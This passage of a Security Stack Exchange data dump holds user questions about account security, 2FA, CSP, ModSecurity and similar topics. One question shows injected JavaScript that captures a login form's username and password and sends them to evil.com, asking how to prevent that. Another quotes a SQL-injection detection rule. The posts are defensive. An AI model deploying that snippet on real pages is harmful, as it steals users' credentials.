","13888","","13888","","2023-05-21 15:52:51","2023-05-21 15:52:51","Should I back up my Google Authenticator codes to my Google Account?","<authentication><account-security><multi-factor>","0","1","","2023-05-21 16:03:10","","CC BY-SA 4.0"
"270403","1","270506","","2023-05-25 00:15:22","","0","56","<p>I work at a Library Makerspace and we're in a discussion about patron security on the makerspace computers.</p>
<p>We have a lot of patrons logging in to their personal accounts because it's (currently) the only way to download or upload project files.  Most often people will log into their email just to download a single file.</p>
<p>Often these emails are left open, but the computers reset enough to make the window of opportunity for an attack pretty small.</p>
<p>I had the idea that it might be nice to have a guest email that is always logged in, so patrons could send stuff to it instead.  The obvious issue here is that this email could be abused: peoples addresses could be taken, their files could be seen, etc.</p>
<p>At the same time, having them log into their own accounts is risky too.  Nobody here is checking for keyloggers, and I've had plenty of chances to grab a computer before it restarts.  I've logged a lot of people out already.</p>
<p>Neither of these solutions seem great.</p>
<p>There's an additional factor of things like &quot;TinkerCad&quot; or &quot;SketchUp&quot; which are web-apps that require a login to use.  First time users could be forced to create an account, thus having to login to their email (keylogger time).  Or we could have a shared public account and they'll be able to see things other people have made.</p>
<p>In my mind, the risk of someone getting my email address or seeing a file I sent to a public computer is vastly less of an issue than someone getting <em>into</em> my email account.  But I've never seen a publicly logged in email on a public computer, and I suspect there's good reason for that too.  Emotionally, it seems weird.  But logically, is that worse?</p>
<p>What's the worst I could do with a publicly open account?  I already know I've had plenty of access to private accounts with the way we're doing things now.</p>
<p><strong>What is good protocol for web accounts on public computers?  Is it worse to have a shared one where patrons can see some of each-others stuff, or have patrons risk the entirety of their own private accounts?</strong></p>
<p>Also, just to be clear, expecting random patrons (many of them elderly) to follow proper security protocols is not something I can make happen.  This is something a few of my coworkers have suggested... I'm looking for alternatives.</p>
","90600","","","","","2023-05-30 20:13:22","Public computers and services that require an account","<account-security>","1","0","","","","CC BY-SA 4.0"
"198819","1","198821","","2018-11-30 15:24:49","","1","553","<p><em>Note: This is based on a true story!</em></p>

<h2>The Story:</h2>

<p>Alice and Bob are good friends and each one knows the personal email address of the other person and they contact with each other using it. Let's assume they are <code>bob@example.com</code> and <code>alice@example.com</code> for Bob and Alice, respectively. </p>

<p>Bob is a member of an online community (i.e. such as a forum) and he has put another email address of him, say <code>carol@gmail.com</code>, on his profile so that other users can contact him using it (that online community does not have a built-in message system for the users to contact with each other). Further, Bob has setup <code>bob@example.com</code> as the recovery email address of <code>carol@gmail.com</code>. And he has not (intentionally) put any other personal information on his profile that says this account belongs to Bob.</p>

<p>Alice knows that Bob is a member of this online community, however she doesn't know which account belongs to Bob. She suspects that this profile with the email address <code>carol@gmail.com</code> on it belongs to Bob, but she is not sure of it. In order to confirm her suspicion, she comes up with this plan:</p>

<p>She goes to Gmail website, enter <code>carol@gmail.com</code> as the email address and presses <code>Forgot password?</code> button. Then the following message is shown:</p>

<blockquote>
  <p>To get a verification code, first confirm the recovery email address you added to your account: ""b********@example.com""</p>
</blockquote>

<p>She enters <code>bob@example.com</code> and then the following message is shown:</p>

<blockquote>
  <p>Please enter the verification code sent to <code>bob@example.com</code> ...</p>
</blockquote>

<p>That's it! She finds out that the account and email address belongs to Bob. She gets very excited and sends the following message to <code>carol@gmail.com</code> as a result:</p>

<blockquote>
  <p>Ha ha! EXPOSED!</p>
</blockquote>

<h2>The Question:</h2>

<p>Well, Bob is very furious at this. He argues that he has followed all the security guidelines and he has tried hard to not expose any of his personal information and identity. Rather, he blames email provider (i.e. Gmail) and says that they should have designed the account recovery mechanism such that it protects the identity of the person behind the email address.</p>

<p>On the other hand, Alice, at the same time being proud of her ingenious plan, thinks that in this case there is an inevitable trade-off between convenience and security. She says that Bob has setup the recovery email so that he does not worry about his password being forgotten by him, and in turn this has the side effect of revealing his identity.</p>

<p>Who is right here? If you think Bob is wrong, what should have he done to both secure his identity and his email (i.e. keep it recoverable)? And if you are on Bob's side and think it is the email provider's fault, how should have they implemented the recovery mechanism?</p>

<p><strong>Further, note that I am not insisting that only one of the parties is right and the blame is on the other side. It might be that both parties are wrong or right as well. If you have other viewpoints, I would be glad to hear them.</strong></p>
","113984","","113984","","2018-11-30 15:44:25","2018-11-30 15:45:37","Find the person behind an email address using its recovery email in Gmail","<email><account-security><gmail><recovery>","2","6","","","","CC BY-SA 4.0"
"133937","1","","","2016-08-15 16:32:33","","3","133","<p>During an offline transaction, the Point-of-Sale has no internet connection,
and so the payment terminal cannot verify if the client’s payment
device has been revoked. </p>

<p>A malicious person can use a revoked bank card to perform unauthorized
transactions. </p>

<p>How can this be prevented?</p>
","121499","","111626","","2016-08-15 16:41:53","2016-08-15 16:44:34","NFC Security for Payment","<wireless><security-theater><nfc><payment>","1","1","","","","CC BY-SA 3.0"
"270479","1","270480","","2023-05-30 05:22:08","","0","201","<p>I need to know what is &quot;method enforcement&quot; inside WAF Preconfigured ModSecurity rules.</p>
<p>How to test this attack on magento website? What is security best practice to prevent this?</p>
","293521","","6253","","2023-05-30 08:03:46","2023-05-30 18:03:53","What is Method Enforcement. How to simulate this attack?","<waf><mod-security>","2","0","","","","CC BY-SA 4.0"
"270573","1","","","2023-06-04 22:29:42","","0","49","<p>I am employed by a security agency that recently implemented a policy prohibiting the use of TikTok on work phones. Instead of carrying two phones, I decided to use MDM to separate my work and personal apps on my iPhone. However, I'm now wondering if TikTok on my personal side might somehow access the sensitive data on my work side. I know it sounds concerning given where I work, but I'm mainly interested in the technical details because I can't seem to find a clear answer.</p>
","147431","","147431","","2023-06-04 22:33:43","2023-06-04 23:49:08","Is it possible for TikTok to access data from apps that are within the perimeter of a MDM?","<account-security><iphone>","1","0","","","","CC BY-SA 4.0"
"134078","1","","","2016-08-16 23:36:50","","4","550","<p>Can XSS be prevented <strong>100%</strong> by setting the content security policy as <code>default-src 'self'</code>? Is there any way XSS can happen in that case? One possibility I can think of is injecting user input into one of your scripts dynamically at the server-side, do you agree? Are there any other vulnerabilities you can think of?</p>
","118278","","118278","","2016-08-16 23:44:35","2016-08-18 18:43:46","XSS and Content Security Policy","<xss><javascript><content-security-policy>","2","2","","","","CC BY-SA 3.0"
"134171","1","134175","","2016-08-17 20:57:17","","1","399","<p>Say that I have a website that allows for a user to reset his password through either email or via text message. The user should be allowed to choose one or the other. </p>

<p>Without giving away too much information, what would be the optimal amount of characters to display for a phone number and for an email address to allow the user to reset their password?</p>

<p>Most sites that I've come across don't display emails at all (knowing only a few characters could help an attacker link an email to an account), and just send a reset email silently. But phone numbers seem to be treated differently, as sites tend to display at least part of phone numbers, often using the last two characters of the number like so:
<code>(***)-***-**55</code></p>

<p>Is this the best convention to follow in terms of balancing usability and security? Why do websites display any part of a phone number when they don't display emails, and is there any associated risk with displaying that the user has a phone and/or email connected to their account in the first place?</p>
","117792","","","","","2016-08-17 21:09:23","Why do websites show parts of phone numbers, but never email addresses?","<web-application><account-security>","1","1","","","","CC BY-SA 3.0"
"199045","1","","","2018-12-04 05:54:19","","1","689","<p>If an employee's laptop is taken back from him/her for purposes of investigation, can the IT department/team that is in charge of issuing laptops etc. log into the employee's network account on this laptop on their own or does the employee need to provide his/her credentials </p>
","192807","","192807","","2018-12-05 12:28:59","2018-12-05 12:28:59","Getting access and logging into employee's laptop - Can IT get access without the employee's own credentials?","<authentication><windows><account-security><credentials><administration>","2","3","","","","CC BY-SA 4.0"
"270614","1","","","2023-06-07 02:21:38","","0","101","<p>Referring to <a href=""https://security.stackexchange.com/questions/20706/what-is-the-difference-between-authorized-keys-and-known-hosts-file-for-ssh"">this post</a>. We learned about ssh today, and I know that you have to add your public key to the &quot;authorized_keys&quot; manually on the server, but the very first time you log into the server, it will add itself to your (client-side) &quot;known_hosts&quot;. Why are you not automatically updated to be a part of the server's &quot;authorized_keys&quot; upon first access (after presenting your password and authenticating yourself)?</p>
","293842","","","","","2023-06-07 04:49:29","Why is known_hosts automatically updated but authorized_keys is not?","<authentication><network><public-key-infrastructure><ssh><account-security>","2","0","","","","CC BY-SA 4.0"
"270619","1","","","2023-06-07 05:22:41","","0","112","<p>My Facebook was hacked, and it has no recovery options, however I accidentally got the hacker's email.</p>
","293845","","6253","","2023-06-07 07:27:51","2023-06-07 07:30:08","I was hacked, I have the hacker's email","<account-security><facebook>","1","1","","2023-06-07 07:27:56","","CC BY-SA 4.0"
"270676","1","","","2023-06-11 16:52:06","","0","332","<p>I got this security alert from Google lately, but I'm not sure if it is legit. Someone might have tried to scam me, because it says my E-Mail was linked to another as the recovery email. Either coincidence or someone wanted to harm me. I'm not even sure, whether this email is real, because it was sent from identity-reachout.bounces.google.com, which doesn't really sound like it's a legit email, but has been signed accounts.google.com. I have logged into my Google account and removed any of my older logins, because of previous attempts of getting my custom ROM to work properly. Not only that, but I have checked for unauthorized logins and more, but I'm still very suspicious of that email. Any advice? Is this actually a legit email from Google and is my account affected? If it's real: what should I make sure, to not get my account permanently deleted?</p>
<p>I have this screenshot of the email's body …<br/>
<a href=""https://i.stack.imgur.com/xtUrq.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xtUrq.png"" alt=""Email content"" /></a></p>
<p>… and this screenshot of the email information.<br/>
<a href=""https://i.stack.imgur.com/Obt0F.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Obt0F.png"" alt=""Sender information"" /></a></p>
<p>Generally, my account's language is set to German, while the stated linked email's might be set to English.</p>
","294026","","","","","2023-07-14 14:07:20","Is this google security alert legit?","<email><account-security><google><phishing>","1","6","","","","CC BY-SA 4.0"
"199170","1","","","2018-12-05 17:03:12","","2","1504","<p>I just got an email from a financial institution in answer to a question I raised with them. It came in the form of a ""secure email"" from Forcepoint, which requires you to open an HTML document and click on a link contained within. The document has an encrypted block of code in it which I presume is used in the process of creating the link / communicating with the remote server.</p>

<p>The link then gave me a registration form to fill in including a password and security question. I generated a random password and bogus answer for this purpose as I would always do.</p>

<p>After that I got another link by email which gave me the answer to my original question. </p>

<p>The whole process had a bad smell to it, including the dodgy-looking domain names involved (""voltage-pp-0000.secure-mailcontrol.com"" - really?).</p>

<p>What's the security advantage of this, if any? Requiring you to click on an attachment seems like a really bad idea. I only followed the instructions because the context was such that I knew it was very unlikely to be a phishing attempt and none of the information asked for would be of any use if it were.</p>
","24287","","","","","2019-12-01 19:01:40","Forcepoint secure email","<email><security-theater>","2","0","","","","CC BY-SA 4.0"
"270777","1","","","2023-06-15 11:41:47","","0","93","<p>I've read bits around this, but I am curious should I be worried. I constantly am getting hit with random GET and POST requests from I guess just bots crawling the web trying to find vulnerabilities.</p>
<p>You can see below, the <code>POST /GponForm/diag</code> is one, the <code>GET /client/get_targets</code> basically everything that isn't <code>GET /highscores</code> in that screenshot, is from some random server somewhere pinging random endpoints.</p>
<p>Is there anything I can do or should be worried about? My server setup is basically a IIS reverse proxying a nodejs application. But I'm unsure what to do. I initially had another smaller server infront of this server as a proxy and then configured this server to only accept requests from the proxy server but i'm trying to cut costs since it's just a side project so don't want a lot of servers running with lots of requests going through.</p>
<p>Any advice? Is it just okay to leave as is? Or should I configure or do something about it.</p>
<p>Thank you!</p>
<p><a href=""https://i.stack.imgur.com/PEXfK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/PEXfK.png"" alt=""enter image description here"" /></a></p>
","294197","","294197","","2023-06-15 11:42:45","2023-07-15 17:21:29","Random endpoint getting pinged constantly on my server","<account-security><internet><web><iis><node.js>","1","0","","2023-07-15 21:51:32","","CC BY-SA 4.0"
"270819","1","","","2023-06-17 23:04:30","","0","94","<p>Currently, I have someone attempting to login to my microsoft account. Upon looking at my activity history I am now seeing almost a hundred failed sign in attempts with the reason being &quot;incorrect password entered&quot;. However, recently I have been getting Microsoft Authenticator popups on my phone to sign in to my account (not created by me). Looking at this further I can see that it isnt required for a person to have the password in order to trigger a 2FA request. You just need to click &quot;Other ways to sign in&quot;. All this person has is my email but they are able to trigger popups on my end. How is this the case? Every other platform I know requires the username and password to be entered before 2FA is triggered. Is there anything I can do to stop this person sending notifications to my phone.<a href=""https://i.stack.imgur.com/ONFck.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ONFck.png"" alt=""enter image description here"" /></a></p>
","294297","","","","","2023-07-19 19:06:45","Microsoft 2FA triggered without password?","<account-security><multi-factor>","1","1","","","","CC BY-SA 4.0"
"199340","1","","","2018-12-08 00:13:31","","1","361","<p>Today, I read <a href=""https://thehackernews.com/2018/12/quora-hack.html"" rel=""nofollow noreferrer"">this article</a> that said that some hacker stole personal information of 100 million users of Quora — which allegedly is half of the total user base of Quora. This is kind of like when Facebook users' data got stolen a couple of years ago.</p>

<p>I have used Quora for maybe 3 years. I know that our information got stolen. But what is the big problem about that? There is no big change in my life. And (maybe) so for other people.</p>

<p>I am not that paranoid about the security awareness, so I don't know what is so dangerous about this kind of accident. Is the theft of personal information really such a bad accident?</p>
","157403","","113729","","2019-10-23 07:36:43","2019-10-23 07:36:43","Why are data breaches like the one at Quora considered so bad?","<account-security><awareness><social-media><breach>","3","2","","","","CC BY-SA 4.0"
"199492","1","199493","","2018-12-10 16:08:00","","2","157","<p>I'm currently job searching, and came across a site that knows when I'm signed into G-mail. A quick look at the login page shows that I can use my Gmail account to login. </p>

<p>Looking at the Google API, it seems they do <a href=""https://developers.google.com/apis-explorer/#search/email/"" rel=""nofollow noreferrer"">provide</a> away to access a users inbox with certain examples shown <a href=""https://developers.google.com/gmail/api/guides/sending"" rel=""nofollow noreferrer"">here</a>. </p>

<p>Is there a way to check if these methods and capabilities have been implemented, and if so, how can I minimize the access to my account?</p>

<p>I'm aware I can create an original account on the site, separate from my Gmail account. </p>
","","user192946","","","","2018-12-10 17:18:28","Websites that can connect with Gmail","<access-control><google><account-security>","1","0","","","","CC BY-SA 4.0"
"58789","1","58822","","2014-05-27 01:42:25","","13","15411","<pre><code>&lt;?php
header(""Content-Security-Policy: default-src 'sha256-"".base64_encode(hash('sha256', 'console.log(""Hello world"");', true)).""'"");
?&gt;
&lt;script&gt;console.log(""Hello world"");&lt;/script&gt;
</code></pre>

<p>However I still receive in Chrome:</p>

<blockquote>
  <p>Refused to execute inline script because it violates the following
  Content Security Policy directive: ""default-src
  'sha256-1DCfk1NYWuHM8DgTqlkOta97gzK+oBDDv4s7woGaPIY='"". Either the
  'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce
  ('nonce-...') is required to enable inline execution. Note also that
  'script-src' was not explicitly set, so 'default-src' is used as a
  fallback.</p>
</blockquote>

<p>I've toyed with this for over an hour but still am unable to generate a hash that matches examples eg.</p>

<p><a href=""http://software-security.sans.org/downloads/appsec-2014-files/building-a-content-security-policy-csp-eric-johnson.pdf"" rel=""noreferrer"">http://software-security.sans.org/downloads/appsec-2014-files/building-a-content-security-policy-csp-eric-johnson.pdf</a>
Claims <code>&lt;script&gt;alert('Allowed to execute');&lt;/script&gt;</code> (hard to determine original spacing) has hash of <code>sha256-MmM3YjgyNzI5MDc5NTA0ZTdiCWViZGExZDkxMDhlZWIw NDIwNzU2YWE5N2E4YWRjNWQ0ZmEyMDUyYjVkNjE0NTk=</code></p>

<p>Which doesn't make much sense: the last part doesn't start with <code>sha256-</code>, but at least the first hash is the correct length. I get <code>sha256-nbFv/38jW7zf8mQirwFemFjDwp5CwIaorxe4Z3yycn0=</code> as the hash for <code>alert('Allowed to execute');</code></p>

<p><a href=""http://nmatatal.blogspot.com/2013/09/how-my-script-hash-poc-works.html"" rel=""noreferrer"">http://nmatatal.blogspot.com/2013/09/how-my-script-hash-poc-works.html</a>
Claims:
<code>&lt;script&gt;console.log(""Hello world"");&lt;/script&gt;</code> should have a csp of
<code>script-src 'sha256-y/mJvKQC/3H1UwsYAtTR7Q=='</code> eyeballing it, that looks too short.</p>

<hr>

<p>What am I doing wrong?</p>
","41628","","3119","","2015-01-31 20:05:04","2019-06-18 21:55:58","Content-Security-Policy hash of script","<hash><xss><http><html><content-security-policy>","3","2","","","","CC BY-SA 3.0"
"271221","1","","","2023-07-13 14:16:11","","0","37","<p>PLAID is used by Wise app and I disconnected from the connected bank after the set up which was less than 24 hrs ago, changed password, then emailed PLAID and Wise to delete my personal information.  Is my personal info safe? What happens if PLAID’s data gets breached? I haven’t heard yet, but now I am regretting it.  The Wise app set up required images of my ID, ss#, and photo of my face. - please help!</p>
","295348","","","","","2023-07-13 14:16:11","PLAID connection to Wise app, safety after the fact","<privacy><account-security>","0","1","","","","CC BY-SA 4.0"
"134777","1","134784","","2016-08-24 08:17:13","","2","1403","<p>Everyone owns a card from the bank. Every card has 4 digit pin.</p>

<p>If someone steals / finds my card I know that this 10.000 combinations are silly stuff to crack. I presume with some piece of hardware (card reader) and brute force it's too easy. </p>

<p>Does the bank card have any other security other than 4 digit pin and how does it work?</p>
","88159","","98538","","2016-08-24 08:19:04","2016-08-24 10:50:50","How secure are pins on credit / bank cards?","<brute-force><credit-card><banks><account-security>","3","4","","","","CC BY-SA 3.0"
"199667","1","","","2018-12-13 04:43:40","","1","1690","<p>Is it poor practice to use the last 4 digits of a social security number as an identifier? </p>

<p>The last 4 digits of a person's social are commonly used as a means of personal identification/authentication, but I can't find guidelines regarding their usage as such. It seems that needlessly exposing part of one's SSN creates an avoidable attack vector.</p>
","2916","","98538","","2018-12-14 09:14:18","2018-12-14 09:23:37","Is it poor practice to use the last 4 digits of a social security number as an identifier?","<attack-vector><information-gathering><social-security-number>","2","3","","","","CC BY-SA 4.0"
"271331","1","","","2023-07-20 15:27:51","","0","95","<p>I noticed that web apps like Gmail, Microsoft, Roundcube etc. when logging in, times out.</p>
<p>To be more specific - if I i.e. open up Gmail and enter the username or NOTHING AT ALL(!) and after two hours or so get back to the tab and try to login the request fails.</p>
<p>What kind of security does this offer at all?</p>
<p>Is this for the case that the user inputs their username and doesn't finish the process or what?</p>
","204820","","","","","2023-07-21 09:29:14","What security feature is this exactly?","<web-application><account-security>","0","4","","","","CC BY-SA 4.0"
"199800","1","","","2018-12-15 08:26:28","","0","173","<p>Today when I logged in Facebook, no 2FA was shown.</p>

<p>I have been using SMS message as the second authentication factor. When I looked at the security settings, 2FA seemed to be disabled. I immediately set it up again, and performed the security check (change password, check phone number, posts, comments) offered by the ""Not me"" log-in option.</p>

<p>Since I usually use Facebook on semi-public computers, the account <em>might</em> be hacked. Are there any other things that I should do to protect the account?</p>

<p>I assume that there should be some SMS confirmation before succeeding in turning off 2FA, but I received none. Should I worry my phone's security? Also, although I didn't reuse my Facebook account password on other sites, are there other credentials I have to change?</p>
","114489","","","","","2020-01-09 23:02:20","What should be done if 2FA was turned off in an unexpected manner?","<authentication><multi-factor><account-security><credentials>","1","0","","","","CC BY-SA 4.0"
"271474","1","","","2023-07-31 20:06:03","","0","52","<p>I look forward to your suggestions. We are concerned with the question of how to best and most easily implement a secure admin network for our IT administrators.</p>
<p>Our team consists of three groups - Network, Server, and Support - and each team has specific tasks related to permissions. Each administrator has two AD accounts: a personal one and an administrative one. Currently, all PCs are in the same network, which poses potential security risks as it allows access to other networks.</p>
<p>Our network team requires external support from manufacturers, for example, for the firewall, which needs to be conducted via video conferencing.</p>
<p>We are now looking for ways to introduce a secure environment for all IT teams, allowing each team to fulfill its tasks while keeping the admin network protected. Do you have any suggestions?</p>
<p>A proposal has already been made to access the other components from a central computer, a so-called Admincenter. However, we are aware that this is not an ideal solution. Therefore, we are open to alternative ideas and expert advice.</p>
<p>Thank you in advance for your support!</p>
","296082","","","","","2023-07-31 20:06:03","Securing an Admin Network for IT Administrators","<network><account-security><server><administration>","0","0","","","","CC BY-SA 4.0"
"200077","1","","","2018-12-19 17:31:11","","0","940","<p>I learned I can access my router from a the internet like so
http://ipaddress/login.html</p>
<p><a href=""https://i.stack.imgur.com/2vY2n.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/2vY2n.png"" alt=""enter image description here"" /></a></p>
<p>I was wondering if anyone could gain access to my router control panel. IF that is the case can they compromise my home network that connects to the router? Any malicious code or anything. Or i should not be worried at all</p>
","194637","","6253","","2022-06-28 18:44:23","2022-07-03 11:11:56","Router access, am I in danger?","<vulnerability><router><account-security>","3","4","","","","CC BY-SA 4.0"
"200119","1","","","2018-12-20 11:04:42","","-2","396","<p>I was browsing Reddit on its official mobile app. I tapped on a photo to see a larger version. I was expecting to be lead to Imgur, but to my surprise it went to Google Photos.<br>
Having the app for Google Photos, my phone (an Android device) opened that and showed the photo (an animated gif, iirc). I was logged in to Google Photos at that time, as that's coupled to the device account.</p>

<p><strong>What, if any are the security risks of having done this?</strong></p>

<p>I have no reason to believe anything malicious was intended or has ahppened, but is there anything I should do or check?</p>
","34215","","","","","2018-12-20 18:40:13","What are the risks of visiting someone else's Google Photo while logged in?","<account-security><google-apps>","1","0","","","","CC BY-SA 4.0"
"271539","1","","","2023-08-04 18:25:08","","0","49","<p>I use two-factor authentication where possible, I was always under the impression that not only it prevents brute-force attacks, but makes it safer to use my accounts in untrusted environments.</p>
<p>I always relied on a fact that sites offer me option to invalidate active sessions and in most cases notify me of changes made to my account.</p>
<p>But recently, I noticed, that on some sites, I'm able to add/remove or disable 2nd factor authentication without confirming the change with 2nd factor. Which would mean that when I login on a compromised device and my session cookie is stolen,
then nothing prevents attacker to take over my account, they could simply add their passkey/token and delete mine.</p>
<p>Most notably I tried this on <strong>microsoft.com</strong> and <strong>google.com</strong> accounts.</p>
<p>Is there a way to prevent this kind of account takeover with stolen session?</p>
<p>Is there some technical/procedural reason which would explain the lack of re-authentication to confirm changes in security settings on side of these login providers?</p>
","16670","","","","","2023-08-04 18:25:08","Two-Factor authentication bypass","<account-security><multi-factor><access-token><hardware-token><account-lockout>","0","0","","","","CC BY-SA 4.0"
"271566","1","271567","","2023-08-07 01:17:40","","0","75","<p>Recently, I discovered that MFA apps just calculate that codes based on a private key and the time clock, so it's easy to use tools like <a href=""https://www.passwordstore.org/"" rel=""nofollow noreferrer"">gnu pass</a> to replace those apps with your computer.</p>
<p>But what are the securities drawbacks when we do that? The point of MFA is to ensure that an attack needs not only the username and password but access to some physical device, right? Can computers with MFA programs meet this requirement? What are the situations in which computer use can be a security flaw?</p>
","291805","","","","","2023-08-07 03:34:13","Is using the computer for MFA safe?","<authentication><passwords><account-security><multi-factor><one-time-password>","1","0","","","","CC BY-SA 4.0"
"59358","1","59457","","2014-06-04 15:26:47","","1","2203","<p>I have a classic ModSecurity configuration (apt-get...)</p>

<pre><code>SecRuleEngine Off

SecPcreMatchLimit 1000
SecPcreMatchLimitRecursion 1000

SecAction ""phase:1,t:none,nolog,pass, \
setvar:'tx.allowed_methods=GET HEAD POST OPTIONS', \
setvar:'tx.allowed_request_content_type=application/x-www-form-urlencoded multipart/form-data text/xml application/xml application/x-amf', \
setvar:'tx.allowed_http_versions=HTTP/0.9 HTTP/1.0 HTTP/1.1', \
setvar:'tx.restricted_extensions=.asa/ .asax/ .ascx/ .axd/ .backup/ .bak/ .bat/ .cdx/ .cer/ .cfg/ .cmd/ .com/ .config/ .conf/ .cs/ .csproj/ .csr/ .dat/ .db/ .dbf/ .dll/ .dos/ .htr/ .htw/ .ida/ .idc/ .idq/ .inc/ .ini/ .key/ .licx/ .lnk/ .log/ .mdb/ .old/ .pass/ .pdb/ .pol/ .printer/ .pwd/ .resources/ .resx/ .sql/ .sys/ .vb/ .vbs/ .vbproj/ .vsdisco/ .webinfo/ .xsd/ .xsx/', \
setvar:'tx.restricted_headers=/Proxy-Connection/ /Lock-Token/ /Content-Range/ /Translate/ /via/ /if/'""
</code></pre>

<p>And I get this error:</p>

<pre><code>--70244300-A--
[04/Jun/2014:17:14:29 +0200] U4831X8AAAEAAFDVH5IAAAAS X.X.X.X 58274 Y.Y.Y.Y 80
--70244300-B--
GET /images/login_bg.jpg HTTP/1.1
Host: myHost.local
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:29.0) Gecko/20100101 Firefox/29.0
Accept: image/png,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://myHost.local/css/main.css
Cookie: symfony=9a09bb2c53df046aae0ed80c501c9585
Connection: keep-alive

--70244300-F--
HTTP/1.1 200 OK
Last-Modified: Wed, 05 Nov 2008 14:54:40 GMT
Accept-Ranges: bytes
Content-Length: 31429
Content-Type: image/jpeg
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: sameorigin
Connection: close

--70244300-E--

--70244300-H--
Message: Rule 7f36b7b712b0 [id ""950901""][file ""/etc/modsecurity/modsecurity_crs_41_sql_injection_attacks.conf""][line ""77""] - Execution error - PCRE limits exceeded (-8): (null).
Apache-Handler: proxy-server
Stopwatch: 1401894869729902 23796 (- - -)
Stopwatch2: 1401894869729902 23796; combined=9162, p1=144, p2=8864, p3=3, p4=82, p5=67, sr=0, sw=2, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.6.6 (http://www.modsecurity.org/).
Server: Apache

--70244300-Z--
</code></pre>

<p>The strange rule:</p>

<pre><code>#
# -=[ SQL Tautologies ]=-
#
SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* ""(?i:([\s'\""`´’‘\(\)]*)?([\d\w]+)([\s'\""`´’‘\(\)]*)?(?:=|&lt;=&gt;|r?like|sounds\s+like|regexp)([\s'\""`´’‘\(\)]*)?\2|([\s'\""`´’‘\(\)]*)?([\d\w]+)([\s'\""`´’‘\(\)]*)?(?:!=|&lt;=|&gt;=|&lt;&gt;|&lt;|&gt;|\^|is\s+not|not\s+like|not\s+regexp)([\s'\""`´’‘\(\)]*)?(?!\6)([\d\w]+))"" \
        ""phase:2, \
        rev:'2.2.5', \
        capture, \
        multiMatch, \
        t:none, \
        t:urlDecodeUni, \
        t:replaceComments, \
        ctl:auditLogParts=+E, \
        block, \
        msg:'SQL Injection Attack', \
        id:'950901', \
        logdata:'%{TX.0}', \
        severity:'2', \
        tag:'WEB_ATTACK/SQL_INJECTION', \
        tag:'WASCTC/WASC-19', \
        tag:'OWASP_TOP_10/A1', \
        tag:'OWASP_AppSensor/CIE1', \
        tag:'PCI/6.5.2', \
        setvar:'tx.msg=%{rule.msg}', \
        setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score}, \
        setvar:tx.anomaly_score=+%{tx.critical_anomaly_score}, \
        setvar:tx.%{rule.id}-WEB_ATTACK/SQL_INJECTION-%{matched_var_name}=%{tx.0}""
</code></pre>

<p>I get this error for every request... Why !?</p>

<p><strong>EDIT:</strong>
My <code>SecRuleEngine</code> is <code>Off</code> in my global settings BUT it's set to <code>DetectionOnly</code> foreach VHOST.</p>
","47799","","47799","","2014-06-06 15:02:49","2014-06-06 15:02:49","Strange bug in ModSecurity with the rule 950901","<proxy><apache><mod-security>","1","3","","","","CC BY-SA 3.0"
"200190","1","200191","","2018-12-21 14:05:17","","0","357","<p>Let's assume an attacker manages to inject this script in a login page:</p>

<pre><code>const form = document.getElementsByTagName('form')[0];

form.addEventListener('submit', stealCredentials);

function stealCredentials() {
    const login = document.getElementsByName('login')[0].value;
    const password = document.getElementsByName('password')[0].value;

    fetch('evil.com/?login=' + login + '&amp;password=' + password);
}
</code></pre>

<p>Is it possible to prevent the request ? 
Same Origin Policy doesn't seem to support such restriction.</p>

<p>Maybe a whitelist similar to the one from Content Security Policy ? </p>
","183814","","","","","2018-12-21 14:20:50","Prevent javascript cross-origin write","<xss><javascript><same-origin-policy><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"200348","1","","","2018-12-25 12:46:05","","1","4434","<p>I am from India and working on a B2C service product. There I have to transfer money to my customers, so I need their bank account number and IFSC code.</p>

<p>However, I was wondering if there are some norms or compliance for this.</p>

<p>I am requesting bank account details from my users and storing these details on my server in fully encrypted and hashed way which will be readable to only Super Admin to transact.</p>

<p><strong>I am not storing any type of card details</strong>, just bank account numbers and IFSC codes.</p>

<p>I found several such questions but they were card-details centric. As we are not dealing with cards, I assume PCI DSS is not applicable to us.</p>

<p><strong>What are the norms and compliance we need to follow as per RBI or any other Indian government body?</strong></p>
","195314","","192205","","2018-12-25 18:11:56","2021-05-03 04:47:45","Norms and Compliance for storing bank account details","<account-security><banks>","1","1","","","","CC BY-SA 4.0"
"200538","1","200541","","2018-12-29 18:12:19","","15","3664","<p>I went to an article on <a href=""https://medium.com/"" rel=""noreferrer"">medium.com</a> earlier today, and instead of the annoying full screen popup they usually show to returning visitors, I saw this in the upper right corner:</p>

<p><a href=""https://i.stack.imgur.com/Wn38O.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/Wn38O.png"" alt=""Google popup""></a></p>

<p>Right there on the medium page they have my name and google email-address! I do not have an account on Medium, nor have I ever done anything but read various articles I received direct links to.</p>

<p>How is medium able to display this popup? I have no memory of telling them who I am, and with all the talk about cross-origin protections this doesn't seem like it should be possible.</p>

<p>I suppose it probably is a popup feature provided by google, but that sounds like it could be easily misused by any site to steal my name and email. I use firefox, so it can't be some crazy chrome feature.</p>
","195619","","","","","2019-07-06 13:18:07","How does medium.com know my google account?","<account-security><crossdomain>","2","2","","","","CC BY-SA 4.0"
"271878","1","271880","","2023-08-25 07:40:10","","0","40","<p>I found that one of our programs uses an sha256 implementation, that produces different hashes for same inputs, compared to standard libraries (in this case compared to <a href=""https://nodejs.org/api/crypto.html"" rel=""nofollow noreferrer"">node:crypto</a> and <a href=""https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API"" rel=""nofollow noreferrer"">Web Crypto API</a>.</p>
<p>The hashes are different for characters, that are part of &quot;later&quot; blocks of the Unicode (for example emoticons).</p>
<p>The implementation is used</p>
<ul>
<li>to hash a plaintext password, before it's passed on to bcrypt</li>
